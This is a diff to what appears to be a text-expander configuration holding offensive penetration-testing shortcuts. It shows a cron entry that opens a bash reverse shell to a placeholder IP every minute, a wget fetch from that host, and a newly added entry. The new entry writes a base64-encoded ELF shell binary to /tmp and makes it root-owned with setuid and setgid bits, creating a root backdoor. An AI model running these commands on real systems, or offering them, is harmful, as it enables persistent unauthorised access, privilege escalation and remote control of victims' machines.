@@ -134,6 +134,9 @@ matches:
   - trigger: ":cronpersist"
     replace: crontab -l | { cat; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"; } | crontab -
 
+  - trigger: ":fileprivesc"
+    replace: echo "f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAABAEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAAIAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F" | base64 -d >> /tmp/tmp && sudo chown root:root /tmp/tmp && sudo chmod +sx /tmp/tmp
+
   - trigger: ":wget"
     replace: wget http://{{IP}}/
     
